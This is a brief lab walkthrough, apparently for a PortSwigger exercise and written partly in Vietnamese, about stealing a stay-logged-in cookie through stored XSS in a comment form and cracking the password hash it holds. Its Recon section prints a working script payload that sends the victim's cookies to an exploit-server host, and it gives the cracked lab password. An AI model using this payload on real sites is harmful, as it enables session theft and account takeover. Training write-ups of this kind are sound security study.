# Target

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

# Recon

Một trong những cách phổ biến để leak cookie và ở đây cần lấy là cookie stay-login đó chính là stored XSS `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/82e4429c-df97-47d8-a47e-8ed6bedb1524)

Sau đó lấy được password

![image](https://github.com/vanniichan/Portswigger/assets/112863484/6e6a9710-1d32-4acf-9533-3fd36a0576ed)

`carlos:onceuponatime`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/54f5793f-9a28-48c7-98f4-bb2a377009c0)

# Flag:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/931d775d-600b-45f3-a53c-5719a71c22c1)
